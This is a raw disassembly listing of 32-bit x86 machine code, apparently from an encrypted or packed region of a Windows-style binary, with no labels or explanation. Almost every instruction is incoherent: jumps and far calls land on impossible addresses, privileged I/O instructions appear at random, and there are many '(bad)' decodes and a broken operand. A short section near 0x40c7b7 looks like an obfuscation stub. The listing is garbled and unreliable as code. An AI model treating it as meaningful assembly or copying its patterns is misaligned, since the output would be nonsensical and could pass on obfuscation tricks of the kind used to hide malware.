  40c425:	mov    eax,0x71f1e54b
  40c42a:	mov    bh,0x23
  40c42c:	adc    ch,0x8e
  40c42f:	and    eax,DWORD PTR [eax-0x7c]
  40c432:	inc    edx
  40c433:	pop    ebx
  40c434:	sbb    esi,0xffffff9c
  40c437:	mov    edi,0x6c0ded6f
  40c43c:	jp     0x40c49b
  40c43e:	fs aaa 
  40c440:	rcr    BYTE PTR [ebx+0x4d],0x25
  40c444:	mov    al,ds:0xfbc65545
  40c449:	(bad)  
  40c44b:	dec    ecx
  40c44c:	mov    esp,DWORD PTR [edx-0x435a377a]
  40c452:	push   ebp
  40c453:	mov    ebx,0xb26a3847
  40c458:	lods   eax,DWORD PTR ds:[esi]
  40c459:	or     edx,esp
  40c45b:	sbb    DWORD PTR [edi-0x250776],ebx
  40c461:	(bad)  
  40c462:	(bad)  
  40c463:	call   0x3cfa5722
  40c468:	push   edi
  40c469:	xchg   esi,eax
  40c46a:	xchg   ebx,eax
  40c46b:	xchg   ecx,eax
  40c46c:	fistp  QWORD PTR [esi-0x1d5248cc]
  40c472:	clc    
  40c473:	shl    BYTE PTR [ecx+0xc],0x9
  40c477:	mul    eax
  40c479:	imul   esp,DWORD PTR [edx-0x28ec02b7],0x8a03d003
  40c483:	push   edi
  40c484:	push   edx
  40c485:	(bad)  
  40c486:	fdivr  QWORD PTR ds:0x5d38a7d9
  40c48c:	addr16 pop edi
  40c48e:	outs   dx,BYTE PTR ds:[esi]
  40c48f:	inc    esi
  40c490:	(bad)  
  40c491:	pop    ebx
  40c492:	or     DWORD PTR [ebx],esi
  40c494:	stos   DWORD PTR es:[edi],eax
  40c495:	gs sbb dl,ah
  40c498:	popf   
  40c499:	or     eax,0xbd9498b8
  40c49e:	pop    esi
  40c49f:	xchg   esi,eax
  40c4a0:	in     eax,dx
  40c4a1:	addr16 mov ds:0x2d2b,eax
  40c4a5:	(bad)  
  40c4a6:	xor    edx,DWORD PTR [ebp-0x28]
  40c4a9:	ret    0x2f3e
  40c4ac:	mov    ah,0xba
  40c4ae:	sub    eax,DWORD PTR [edi]
  40c4b0:	jnp    0x40c4aa
  40c4b2:	pusha  
  40c4b3:	mov    ebx,0x8e5c6738
  40c4b8:	fist   WORD PTR [ebx]
  40c4ba:	mov    edi,0xd30b39ae
  40c4bf:	jmp    0xc2fa2788
  40c4c4:	and    BYTE PTR [esi+0x5e35f51f],dh
  40c4ca:	pop    ecx
  40c4cb:	mov    edi,0xd2140553
  40c4d0:	adc    al,0xc2
  40c4d2:	or     eax,0x21e11940
  40c4d7:	jnp    0x40c543
  40c4d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4da:	and    ch,BYTE PTR [eax]
  40c4dc:	(bad)  
  40c4dd:	mov    ebp,DWORD PTR [ebx+eiz*8]
  40c4e0:	pop    esp
  40c4e1:	mov    ecx,0x49aaf333
  40c4e6:	data16 clc 
  40c4e8:	add    ebx,DWORD PTR [ecx+0x7d]
  40c4eb:	xchg   edx,eax
  40c4ec:	adc    BYTE PTR [ebx],ah
  40c4ee:	pop    es
  40c4ef:	dec    ecx
  40c4f0:	sub    ch,ch
  40c4f2:	sbb    eax,0x24fe300
  40c4f7:	mov    ecx,DWORD PTR [edx+0x4f]
  40c4fa:	inc    ebx
  40c4fb:	repz push esp
  40c4fd:	das    
  40c4fe:	jle    0x40c4f0
  40c500:	fwait
  40c501:	shl    BYTE PTR [ecx-0x143e0f54],0x1
  40c508:	mov    ah,BYTE PTR [edx-0x49]
  40c50b:	push   eax
  40c50c:	cmc    
  40c50d:	das    
  40c50e:	ins    DWORD PTR es:[edi],dx
  40c50f:	retf   
  40c510:	add    dh,bl
  40c512:	popf   
  40c513:	cld    
  40c514:	daa    
  40c515:	pop    es
  40c516:	mov    edx,0x2e5922b5
  40c51b:	adc    DWORD PTR [bp+0x6f],ecx
  40c51f:	mov    edx,0x58eca1e3
  40c524:	pop    esi
  40c525:	lds    ebp,FWORD PTR [ebx-0x76]
  40c528:	fmul   QWORD PTR [ebx]
  40c52a:	stc    
  40c52b:	mov    eax,0x712293b8
  40c530:	push   esp
  40c531:	dec    ebp
  40c532:	cmp    eax,0x428fe6ad
  40c537:	and    al,0x70
  40c539:	dec    ecx
  40c53a:	add    ebx,DWORD PTR [edx-0x4c]
  40c53d:	js     0x40c569
  40c53f:	not    bh
  40c541:	push   ss
  40c542:	rcr    BYTE PTR [esi],cl
  40c544:	lock inc esi
  40c546:	push   ebp
  40c547:	and    DWORD PTR [ebx+eax*1],esp
  40c54a:	das    
  40c54b:	cmp    BYTE PTR [eax],0xd3
  40c54e:	(bad)  
  40c54f:	std    
  40c550:	sbb    BYTE PTR [esi-0x7],ah
  40c553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c554:	ds sub al,0x4b
  40c557:	test   eax,0x304a506b
  40c55c:	lock mov eax,ds:0x80df1c31
  40c562:	push   ebp
  40c563:	jno    0x40c54f
  40c565:	xchg   ebx,eax
  40c566:	in     al,dx
  40c567:	sub    eax,0x5275e1e9
  40c56c:	sub    DWORD PTR [edi],edi
  40c56e:	retf   
  40c56f:	sbb    bh,BYTE PTR [eax-0xea429a8]
  40c575:	push   edx
  40c576:	rcr    BYTE PTR [edx],1
  40c578:	ret    0x6001
  40c57b:	push   ebx
  40c57c:	lds    edx,FWORD PTR [edi]
  40c57e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c57f:	popf   
  40c580:	(bad)  
  40c582:	call   0x45e7:0x5042eea4
  40c589:	loope  0x40c55b
  40c58b:	ss sahf 
  40c58d:	test   BYTE PTR [esp+ebx*8-0x3d],0x96
  40c592:	nop
  40c593:	arpl   WORD PTR [ebx+ebp*8+0x39],di
  40c597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c598:	xor    esp,DWORD PTR [ecx-0x34]
  40c59b:	sub    al,0xe
  40c59d:	push   ss
  40c59e:	jp     0x40c5ee
  40c5a0:	pop    esp
  40c5a1:	sahf   
  40c5a2:	cmp    ah,BYTE PTR [esp+edx*1+0x17]
  40c5a6:	(bad)  
  40c5a7:	adc    eax,0x5e727bb9
  40c5ac:	cmp    ebp,ebp
  40c5ae:	xchg   edx,eax
  40c5af:	cwde   
  40c5b0:	iret   
  40c5b1:	addr16 rol esp,1
  40c5b4:	jg     0x40c5fb
  40c5b6:	cmp    eax,DWORD PTR [edx+0x43c6cad0]
  40c5bc:	jb     0x40c5ba
  40c5be:	test   bl,0x73
  40c5c1:	rcr    DWORD PTR [ecx],1
  40c5c3:	outs   dx,DWORD PTR ds:[esi]
  40c5c4:	sbb    al,0xc
  40c5c6:	and    bl,BYTE PTR [esi]
  40c5c8:	sub    BYTE PTR [edx],cl
  40c5ca:	mov    BYTE PTR gs:[esi],dh
  40c5cd:	fsubr  DWORD PTR [ecx+0x29]
  40c5d0:	mov    cs,WORD PTR [edi+0x10]
  40c5d3:	es xchg edi,eax
  40c5d5:	xchg   ebx,eax
  40c5d6:	retf   0x2a55
  40c5d9:	rol    BYTE PTR [eax+0x64],cl
  40c5dc:	repz mov edi,0x470aad9
  40c5e2:	ret    
  40c5e3:	pop    eax
  40c5e4:	imul   ebp,DWORD PTR [edi-0x70],0xffffff97
  40c5e8:	sbb    ecx,DWORD PTR [eax]
  40c5ea:	test   al,0xb0
  40c5ec:	jecxz  0x40c58f
  40c5ee:	inc    ecx
  40c5ef:	sbb    DWORD PTR [ebx-0x2ced5520],ebx
  40c5f5:	lea    ebx,[ecx]
  40c5f7:	mov    ebp,0xd8c7d344
  40c5fc:	enter  0x55db,0xf4
  40c600:	fwait
  40c601:	push   ebx
  40c602:	repz add bl,al
  40c605:	xchg   ebp,eax
  40c606:	jmp    0x15a47438
  40c60b:	pop    ss
  40c60c:	in     eax,0x7
  40c60e:	and    BYTE PTR [edi-0x37f4b04e],al
  40c614:	les    eax,FWORD PTR [edx+eax*8+0x22]
  40c618:	jnp    0x40c693
  40c61a:	pop    ds
  40c61b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c61c:	xchg   ebp,eax
  40c61d:	add    al,0x6a
  40c61f:	pop    eax
  40c620:	(bad)  
  40c621:	xchg   ebp,eax
  40c622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c623:	mov    edi,DWORD PTR [ebp-0x5f]
  40c626:	mov    bh,0xb5
  40c628:	mov    bh,0x7d
  40c62a:	pop    eax
  40c62b:	cmp    ecx,ebx
  40c62d:	gs and bl,dl
  40c630:	ret    0x6734
  40c633:	call   0xad5e:0xa692faff
  40c63a:	jp     0x40c65d
  40c63c:	ret    
  40c63d:	ror    al,0x3e
  40c640:	mov    ds:0xce1d2ea1,eax
  40c645:	adc    DWORD PTR [edx+eax*1+0x583b2045],edi
  40c64c:	and    BYTE PTR [eax+ebx*4+0x49825e05],ah
  40c653:	aaa    
  40c654:	mov    ds:0x3f26d89a,eax
  40c659:	ja     0x40c6d3
  40c65b:	out    dx,al
  40c65c:	mov    ds,WORD PTR [ebx-0x22]
  40c65f:	cmc    
  40c660:	fldenv [edi+0x2ba2a43c]
  40c666:	ss in  eax,0x8d
  40c669:	repz push eax
  40c66b:	pop    edi
  40c66c:	shr    BYTE PTR [edi-0x2f860293],1
  40c672:	cmp    BYTE PTR es:[ecx+ebx*2+0x7a],ah
  40c677:	ret    
  40c678:	xlat   BYTE PTR ds:[ebx]
  40c679:	test   BYTE PTR [ebp-0x3bf5a7cd],ch
  40c67f:	jns    0x40c6fa
  40c681:	enter  0xf854,0x8e
  40c685:	mov    DWORD PTR [edx+ebx*1-0x4a6fc931],ebp
  40c68c:	push   cs
  40c68d:	or     esp,esi
  40c68f:	mov    BYTE PTR [esi],cl
  40c691:	mov    ecx,DWORD PTR [esi]
  40c693:	add    BYTE PTR [edx+0x58],dh
  40c696:	push   esp
  40c697:	push   ebp
  40c698:	and    al,0x37
  40c69a:	sahf   
  40c69b:	out    0x96,eax
  40c69d:	and    DWORD PTR [ebp+0x4068012],ecx
  40c6a3:	ins    DWORD PTR es:[edi],dx
  40c6a4:	mov    edx,0x9505a9a6
  40c6a9:	hlt    
  40c6aa:	fldenv [esi+esi*1+0x9b3293e]
  40c6b1:	fst    QWORD PTR [edi-0x26f831b9]
  40c6b7:	sub    bh,BYTE PTR [ebp+0x1b]
  40c6ba:	sbb    dh,BYTE PTR [edi-0x1e]
  40c6bd:	push   esp
  40c6be:	das    
  40c6bf:	fld    TBYTE PTR [eax+0x328ed891]
  40c6c5:	push   cs
  40c6c6:	imul   DWORD PTR [ebx-0x79]
  40c6c9:	loopne 0x40c72b
  40c6cb:	add    edx,DWORD PTR [ebx+0x7f25eda2]
  40c6d1:	xor    bh,0xa7
  40c6d4:	pop    es
  40c6d5:	bswap  ecx
  40c6d7:	shl    DWORD PTR [eax+0x2d],1
  40c6da:	mov    dh,0xdb
  40c6dc:	daa    
  40c6dd:	aaa    
  40c6de:	repz push es
  40c6e0:	test   al,0xa
  40c6e2:	add    al,0xf8
  40c6e4:	cli    
  40c6e5:	sahf   
  40c6e6:	in     eax,dx
  40c6e7:	daa    
  40c6e8:	jae    0x40c688
  40c6ea:	lea    ecx,[ebx+esi*2]
  40c6ed:	jge    0x40c692
  40c6ef:	cmp    al,0xf
  40c6f1:	scas   al,BYTE PTR es:[edi]
  40c6f2:	arpl   WORD PTR [edi],bp
  40c6f4:	pop    ebp
  40c6f5:	mov    ch,BYTE PTR [ebx+esi*8-0x3bd2f679]
  40c6fc:	sbb    edx,DWORD PTR [eax-0x36f3973c]
  40c702:	jp     0x40c687
  40c704:	fist   DWORD PTR [edx+eax*4]
  40c707:	enter  0x9771,0xa7
  40c70b:	or     ah,BYTE PTR [ebp-0x47]
  40c70e:	dec    esp
  40c70f:	jb     0x40c72d
  40c711:	push   esi
  40c712:	out    dx,al
  40c713:	mov    ds:0xbe3a7ac2,al
  40c718:	pop    ds
  40c719:	repz out 0xd8,al
  40c71c:	push   es
  40c71d:	adc    DWORD PTR [ebx+0x4],ebp
  40c720:	pop    edx
  40c721:	lods   al,BYTE PTR ds:[esi]
  40c722:	pop    ebp
  40c723:	ja     0x40c6db
  40c725:	xor    eax,0xe40de8c4
  40c72a:	call   0xd38c29e
  40c72f:	dec    ecx
  40c730:	push   es
  40c731:	jo     0x40c788
  40c733:	mov    ebp,0xf062b93b
  40c738:	(bad)  
  40c739:	retf   
  40c73a:	icebp  
  40c73b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c73c:	scas   eax,DWORD PTR es:[edi]
  40c73d:	dec    ecx
  40c73e:	(bad)
  40c741:	pop    ebp
  40c742:	sbb    DWORD PTR [ecx-0x153d108c],edi
  40c748:	mov    ds:0xd175183c,al
  40c74d:	(bad)  
  40c74f:	data16 jns 0x40c741
  40c752:	jae    0x40c726
  40c754:	jge    0x40c7ac
  40c756:	fidiv  WORD PTR [esp+ebx*8]
  40c759:	push   ds
  40c75a:	mov    cl,BYTE PTR [edx-0x3d]
  40c75d:	loope  0x40c72f
  40c75f:	bound  eax,QWORD PTR [esi+0x37766b81]
  40c765:	out    dx,al
  40c766:	bound  esi,QWORD PTR [eax]
  40c768:	ja     0x40c79c
  40c76a:	jl     0x40c6f0
  40c76c:	sub    ah,BYTE PTR [ecx-0x34]
  40c76f:	xor    al,0xe7
  40c771:	lock test eax,0xf11d0ab6
  40c777:	jmp    0x40c7b7
  40c779:	aad    0x9
  40c77b:	xrstors [ebx]
  40c77e:	loop   0x40c71b
  40c780:	jns    0x40c715
  40c782:	test   eax,0x3e6396bf
  40c787:	es push eax
  40c789:	les    edi,FWORD PTR [esi-0x72bc6877]
  40c78f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c790:	pop    ds
  40c791:	outs   dx,DWORD PTR ds:[esi]
  40c792:	std    
  40c793:	jnp    0x40c78a
  40c795:	sub    bl,bh
  40c797:	aad    0x4c
  40c799:	dec    eax
  40c79a:	std    
  40c79b:	das    
  40c79c:	push   edi
  40c79d:	lahf   
  40c79e:	push   esi
  40c79f:	inc    esi
  40c7a0:	in     eax,dx
  40c7a1:	push   ds
  40c7a2:	cmp    al,0x10
  40c7a4:	rol    DWORD PTR [edx-0xe0f9d2f],cl
  40c7aa:	and    cl,BYTE PTR [esi+0x8]
  40c7ad:	ins    DWORD PTR es:[edi],dx
  40c7ae:	mov    edi,0x8c7ac22a
  40c7b3:	das    
  40c7b4:	out    0x34,eax
  40c7b6:	inc    edx
  40c7b7:	add    al,dl
  40c7b9:	push   0x6
  40c7bb:	add    eax,0xfa
  40c7c0:	mov    BYTE PTR [ebp-0x4],al
  40c7c3:	mov    BYTE PTR [ebp-0x3],0x67
  40c7c7:	pop    eax
  40c7c8:	mov    BYTE PTR [ebp-0x1],al
  40c7cb:	mov    BYTE PTR [ebp-0x2],0x3
  40c7cf:	mov    dl,BYTE PTR [ebp-0x2]
  40c7d2:	movzx  esi,dl
  40c7d5:	cdq    
  40c7d6:	idiv   esi
  40c7d8:	mov    dl,BYTE PTR [ebp-0x1]
  40c7db:	add    al,dl
  40c7dd:	mov    dl,BYTE PTR [ebp-0x3]
  40c7e0:	or     al,dl
  40c7e2:	mov    dl,BYTE PTR [ebp-0x4]
  40c7e5:	add    al,0x3a
  40c7e7:	cmp    dl,al
  40c7e9:	jmp    0x40cbdf
  40c7ee:	xchg   esi,eax
  40c7ef:	and    al,dl
  40c7f1:	cmc    
  40c7f2:	mov    ds:0xdc222674,al
  40c7f7:	mov    cl,BYTE PTR [edi-0x2040cb90]
  40c7fd:	jle    0x40c862
  40c7ff:	cmc    
  40c800:	sbb    BYTE PTR [eax],bl
  40c802:	outs   dx,BYTE PTR ds:[esi]
  40c803:	adc    bl,BYTE PTR [eax]
  40c805:	sbb    BYTE PTR [edi-0x39],cl
  40c808:	xor    eax,0xfe0b79f9
  40c80d:	jbe    0x40c831
  40c80f:	bound  ebp,QWORD PTR [eax-0x5991549b]
  40c815:	jl     0x40c883
  40c817:	imul   ebp,DWORD PTR [ebx],0xffffff9d
  40c81a:	fwait
  40c81b:	pop    esp
  40c81c:	(bad)  
  40c81d:	fiadd  DWORD PTR ds:0xfe876530
  40c823:	loop   0x40c882
  40c825:	call   0xd8f:0x24dec318
  40c82c:	mov    bh,0xf1
  40c82e:	out    0xe9,eax
  40c830:	xchg   cl,dl
  40c832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c833:	and    DWORD PTR [ebx-0x1],eax
  40c836:	push   ebp
  40c837:	pusha  
  40c838:	iret   
  40c839:	add    al,0x78
  40c83b:	xchg   esp,ebx
  40c83d:	push   ebp
  40c83e:	push   ds
  40c83f:	stc    
  40c840:	and    ch,ch
  40c842:	popa   
  40c843:	mov    eax,0xe40c8d20
  40c848:	ror    BYTE PTR [esi],cl
  40c84a:	or     DWORD PTR [edi+edx*2+0xd297b4d],esi
  40c851:	mov    dl,0xff
  40c853:	(bad)  
  40c854:	or     BYTE PTR [edx-0x60],dl
  40c857:	retf   0xfa16
  40c85a:	cs xchg ecx,eax
  40c85c:	pop    es
  40c85d:	in     al,0x4f
  40c85f:	les    ecx,FWORD PTR [eax-0x21112623]
  40c865:	push   es
  40c866:	add    ebp,DWORD PTR [eax-0x18e01ab3]
  40c86c:	mov    bh,0x20
  40c86e:	cmp    al,0x85
  40c870:	cwde   
  40c871:	cwde   
  40c872:	mov    bl,0x91
  40c874:	sub    eax,0x29eb37c1
  40c879:	jno    0x40c8b7
  40c87b:	sbb    eax,esp
  40c87d:	adc    al,0x7e
  40c87f:	push   0x30
  40c881:	repnz inc edi
  40c883:	mov    esp,0x1b4d79b4
  40c888:	les    edx,FWORD PTR [edi+0x75]
  40c88b:	xchg   esi,eax
  40c88c:	or     DWORD PTR [esi-0x73767e2d],ecx
  40c892:	xchg   BYTE PTR [ebp+0x77a76d3],dl
  40c898:	mov    ch,0x22
  40c89a:	inc    edx
  40c89b:	scas   eax,DWORD PTR es:[edi]
  40c89c:	inc    edx
  40c89d:	xchg   esp,eax
  40c89e:	sub    ch,BYTE PTR [esi+0x2775f2ea]
  40c8a4:	dec    ebx
  40c8a5:	and    cl,BYTE PTR [edi-0x6488216d]
  40c8ab:	push   edi
  40c8ac:	stos   DWORD PTR es:[edi],eax
  40c8ad:	xor    ebp,ebp
  40c8af:	lods   eax,DWORD PTR ds:[esi]
  40c8b0:	cmp    eax,0x8d196c02
  40c8b5:	jns    0x40c908
  40c8b7:	jb     0x40c8ad
  40c8b9:	jns    0x40c8d4
  40c8bb:	setge  BYTE PTR [edx+0x10a4fb12]
  40c8c2:	out    0x23,al
  40c8c4:	sbb    al,0x6e
  40c8c6:	(bad)  
  40c8c7:	pushf  
  40c8c8:	sub    eax,0x1a89335d
  40c8cd:	sub    BYTE PTR ds:0xa0f55ef1,cl
  40c8d3:	and    dh,BYTE PTR [esi+0x71]
  40c8d6:	inc    ebx
  40c8d7:	xlat   BYTE PTR ds:[ebx]
  40c8d8:	jl     0x40c8f7
  40c8da:	xor    al,0x34
  40c8dc:	pop    esp
  40c8dd:	sar    DWORD PTR [edi],1
  40c8df:	and    DWORD PTR es:[edi+0x77988b77],ebx
  40c8e6:	and    ecx,DWORD PTR [ebp+0x7357cb84]
  40c8ec:	stos   BYTE PTR es:[edi],al
  40c8ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8ee:	push   ecx
  40c8ef:	push   esp
  40c8f0:	aad    0x43
  40c8f2:	call   0xbbae9e1b
  40c8f7:	jae    0x40c89a
  40c8f9:	out    dx,al
  40c8fa:	stos   BYTE PTR es:[edi],al
  40c8fb:	aas    
  40c8fc:	cmc    
  40c8fd:	cld    
  40c8fe:	outs   dx,BYTE PTR ds:[esi]
  40c8ff:	arpl   WORD PTR [eax],dx
  40c901:	and    al,0x7a
  40c903:	adc    ecx,0x323d9c78
  40c909:	push   esi
  40c90a:	adc    eax,0x52b2f0e3
  40c90f:	xchg   BYTE PTR ds:0xa282ee8c,ch
  40c915:	inc    edx
  40c916:	xor    DWORD PTR [edi+0x544fc7b6],ebx
  40c91c:	addr16 sbb eax,0xabb7d803
  40c922:	repz ror esp,cl
  40c925:	mov    esi,eax
  40c927:	or     edx,DWORD PTR [edx+eax*2-0x347cf69e]
  40c92e:	mov    ch,0x81
  40c930:	(bad)  
  40c932:	adc    eax,0xe05db1b5
  40c937:	and    al,BYTE PTR [ebp+0x3a47811e]
  40c93d:	sti    
  40c93e:	jmp    0x376e:0x3c35c188
  40c945:	fcom   DWORD PTR [edi+0x56]
  40c948:	jecxz  0x40c91e
  40c94a:	sbb    al,0x45
  40c94c:	xchg   DWORD PTR [ebx],edx
  40c94e:	icebp  
  40c94f:	dec    ecx
  40c950:	add    BYTE PTR [edx],0xc3
  40c953:	idiv   BYTE PTR [ecx-0x4f]
  40c956:	cs pushf 
  40c958:	xchg   esi,eax
  40c959:	sub    edx,DWORD PTR [ecx-0x75]
  40c95c:	mov    DWORD PTR [ecx],edi
  40c95e:	cdq    
  40c95f:	pop    edx
  40c960:	in     al,dx
  40c961:	into   
  40c962:	test   DWORD PTR [ebx+0xf],edi
  40c965:	fisubr WORD PTR [esi]
  40c967:	ror    BYTE PTR [ecx],cl
  40c969:	fimul  WORD PTR [esi]
  40c96b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c96c:	lea    edi,[ebx-0x21de52ba]
  40c972:	(bad)  
  40c973:	mov    cl,0xe2
  40c975:	outs   dx,DWORD PTR ds:[esi]
  40c976:	and    dh,BYTE PTR [esi+0x6b477d71]
  40c97c:	xor    bl,BYTE PTR ds:0x692cc446
  40c982:	xor    ebx,0xcbeb60f8
  40c988:	enter  0xe8d2,0xa6
  40c98c:	outs   dx,DWORD PTR ds:[esi]
  40c98d:	push   ds
  40c98e:	pop    ecx
  40c98f:	dec    eax
  40c990:	push   ss
  40c991:	push   edi
  40c992:	mov    ch,0xd8
  40c994:	adc    eax,esi
  40c996:	out    0x6,al
  40c998:	stc    
  40c999:	xlat   BYTE PTR ds:[ebx]
  40c99a:	and    ecx,DWORD PTR [edi+0x69]
  40c99d:	push   0x3
  40c99f:	sahf   
  40c9a0:	jno    0x40c925
  40c9a2:	and    dl,BYTE PTR [esi]
  40c9a4:	ja     0x40ca1b
  40c9a6:	inc    ebp
  40c9a7:	cmp    al,0x3e
  40c9a9:	rcpps  xmm3,XMMWORD PTR [ebx+0x2fac277]
  40c9b0:	pop    es
  40c9b1:	mov    eax,ds:0xe128274
  40c9b6:	push   edi
  40c9b8:	mov    esi,0x728ce94f
  40c9bd:	or     al,0x58
  40c9bf:	(bad)  
  40c9c0:	das    
  40c9c1:	stos   DWORD PTR es:[edi],eax
  40c9c2:	mov    edx,0xeebeffc2
  40c9c7:	mov    esi,0xe3c98f76
  40c9cc:	nop
  40c9cd:	in     al,dx
  40c9ce:	lods   al,BYTE PTR ds:[esi]
  40c9cf:	mov    ah,BYTE PTR [ebp-0x5be2e528]
  40c9d5:	sbb    BYTE PTR [edi+0x35a14525],al
  40c9db:	and    BYTE PTR [eax+0x4e],0x45
  40c9df:	add    BYTE PTR [ebx-0x7f],dh
  40c9e2:	mov    bh,0x7b
  40c9e4:	sar    BYTE PTR [eax-0xadb5a3e],0x5e
  40c9eb:	mov    edx,DWORD PTR [edx-0xa]
  40c9ee:	sbb    al,0xae
  40c9f0:	lock adc BYTE PTR [edi],ch
  40c9f3:	jmp    DWORD PTR [esi+0x49]
  40c9f6:	sti    
  40c9f7:	jns    0x40ca67
  40c9f9:	imul   edi,DWORD PTR [edx],0x14a30168
  40c9ff:	(bad)  
  40ca00:	icebp  
  40ca01:	in     al,dx
  40ca02:	(bad)  
  40ca03:	cmp    edx,edx
  40ca05:	mov    esp,0x20d2fd77
  40ca0a:	ins    BYTE PTR es:[edi],dx
  40ca0b:	cli    
  40ca0c:	popf   
  40ca0d:	out    dx,al
  40ca0e:	or     eax,0x17548255
  40ca13:	pop    ebx
  40ca14:	rcl    DWORD PTR [edi],0x1f
  40ca17:	leave  
  40ca18:	ret    
  40ca19:	fs mov ch,0x69
  40ca1c:	fisubr WORD PTR [ebp-0x5d5701a7]
  40ca22:	mov    ebx,0x25cf9364
  40ca27:	add    eax,0x60916589
  40ca2c:	ficom  WORD PTR [esi]
  40ca2e:	mov    edi,0x676ca689
  40ca33:	test   BYTE PTR [ebp-0x54e56404],dl
  40ca39:	bound  esp,QWORD PTR [ebp-0x75]
  40ca3c:	ds jle 0x40ca7c
  40ca3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca40:	mov    eax,0x79845ba9
  40ca45:	shl    BYTE PTR [edx-0x61e203ac],cl
  40ca4b:	ds mov ah,0xf
  40ca4e:	add    ebp,DWORD PTR [ebx+ebx*1+0x1a]
  40ca52:	jmp    0xcd17dc29
  40ca57:	(bad)  
  40ca58:	cmc    
  40ca59:	pop    ecx
  40ca5a:	inc    ebx
  40ca5b:	adc    al,0x97
  40ca5d:	mov    al,dh
  40ca5f:	mov    eax,ds:0x41c11ada
  40ca64:	icebp  
  40ca65:	(bad)
  40ca6a:	add    eax,DWORD PTR ds:0x88965bea
  40ca70:	jge    0x40caac
  40ca72:	jne    0x40cacd
  40ca74:	out    dx,eax
  40ca75:	in     al,dx
  40ca76:	pop    esi
  40ca77:	sub    al,0x18
  40ca7a:	ja     0x40ca4c
  40ca7c:	les    esi,FWORD PTR [eax+0x6c]
  40ca7f:	test   dh,al
  40ca81:	jl     0x40ca61
  40ca83:	push   ecx
  40ca84:	(bad)  
  40ca85:	repnz fcomp DWORD PTR [ebp-0xaee1739]
  40ca8c:	ds (bad) 
  40ca8e:	sbb    DWORD PTR [esi-0x2b],eax
  40ca91:	dec    edx
  40ca92:	push   esi
  40ca93:	xchg   ecx,eax
  40ca94:	or     edx,edx
  40ca96:	push   ebx
  40ca97:	test   DWORD PTR [esi],esp
  40ca99:	fdivp  st(7),st
  40ca9b:	and    al,0x3d
  40ca9d:	inc    ebx
  40ca9e:	xor    eax,0x4feee2b0
  40caa3:	(bad)  [ebx+edi*4+0x6d]
  40caa7:	cmp    al,0x8f
  40caa9:	mov    ds:0x1520a7cc,eax
  40caae:	out    0xcc,eax
  40cab0:	pushf  
  40cab1:	sub    BYTE PTR [ecx+0x5b],bl
  40cab4:	and    dh,ch
  40cab6:	loop   0x40ca5e
  40cab8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cab9:	nop
  40caba:	mov    bh,0x9a
  40cabc:	add    ah,dh
  40cabe:	in     al,dx
  40cabf:	fld    TBYTE PTR [edi+eax*1+0xc4f29b9]
  40cac6:	outs   dx,BYTE PTR ds:[esi]
  40cac7:	adc    al,0x86
  40cac9:	mov    ds:0x917cddd3,al
  40cace:	jne    0x40ca50
  40cad0:	sbb    al,0x3a
  40cad2:	and    ah,al
  40cad4:	scas   eax,DWORD PTR es:[edi]
  40cad5:	jle    0x40caf6
  40cad7:	jns    0x40cac1
  40cad9:	mov    dh,0xac
  40cadb:	and    al,BYTE PTR ds:0xb56cc739
  40cae1:	outs   dx,DWORD PTR ds:[esi]
  40cae2:	mov    ebp,?
  40cae4:	jo     0x40caa0
  40cae6:	sbb    eax,0xc13136d4
  40caeb:	lahf   
  40caec:	cmc    
  40caed:	jl     0x40cb59
  40caef:	rcr    bl,0x1b
  40caf2:	adc    al,0xc4
  40caf4:	xchg   ecx,eax
  40caf5:	cli    
  40caf6:	xchg   ecx,eax
  40caf7:	ja     0x40caee
  40caf9:	fmul   st,st(4)
  40cafb:	mov    bh,0xa7
  40cafd:	add    BYTE PTR [eax+0x55f68a4f],cl
  40cb03:	add    eax,0xcaae3d34
  40cb08:	cmp    BYTE PTR [edi-0x1660ec6e],ah
  40cb0e:	pop    eax
  40cb0f:	mov    al,0xb8
  40cb11:	std    
  40cb12:	sahf   
  40cb13:	adc    dl,bl
  40cb15:	pop    ebp
  40cb16:	lods   al,BYTE PTR ds:[esi]
  40cb17:	ret    
  40cb18:	imul   edi,DWORD PTR gs:[edi+0x10],0x97cdc8a1
  40cb20:	std    
  40cb21:	xor    BYTE PTR gs:[ebp+0x69],dl
  40cb25:	das    
  40cb26:	pop    ecx
  40cb27:	push   0xffffffaf
  40cb29:	jbe    0x40cb74
  40cb2b:	icebp  
  40cb2c:	div    DWORD PTR ds:0x3e3c6c52
  40cb32:	cs stos DWORD PTR es:[edi],eax
  40cb34:	std    
  40cb35:	dec    eax
  40cb36:	retf   
  40cb37:	not    esi
  40cb39:	arpl   WORD PTR [edi-0x68],cx
  40cb3c:	cdq    
  40cb3d:	pop    ecx
  40cb3f:	ins    DWORD PTR es:[edi],dx
  40cb40:	in     al,0x48
  40cb42:	scas   al,BYTE PTR es:[edi]
  40cb43:	or     esi,ecx
  40cb45:	adc    ebp,DWORD PTR [esi+0x31]
  40cb48:	les    ecx,FWORD PTR [ebp-0x2c55e01b]
  40cb4e:	sbb    dh,BYTE PTR [eax]
  40cb50:	adc    ebp,0x76
  40cb53:	and    ah,BYTE PTR [ebx+0x53]
  40cb56:	xlat   BYTE PTR ds:[ebx]
  40cb57:	jae    0x40cb91
  40cb59:	dec    esi
  40cb5a:	scas   eax,DWORD PTR es:[edi]
  40cb5b:	fistp  DWORD PTR [edi-0x3b]
  40cb5e:	cmp    DWORD PTR [eax],eax
  40cb60:	push   esp
  40cb61:	xor    edx,ebx
  40cb63:	xchg   DWORD PTR fs:[ebx+0x324f56d6],esp
  40cb6a:	pop    esp
  40cb6b:	xor    al,BYTE PTR [ecx]
  40cb6d:	pop    edi
  40cb6e:	and    eax,0x61d60887
  40cb73:	mov    esp,0x6bc06def
  40cb78:	sub    esi,0x94c4e57e
  40cb7e:	lea    ebx,[eax-0x38]
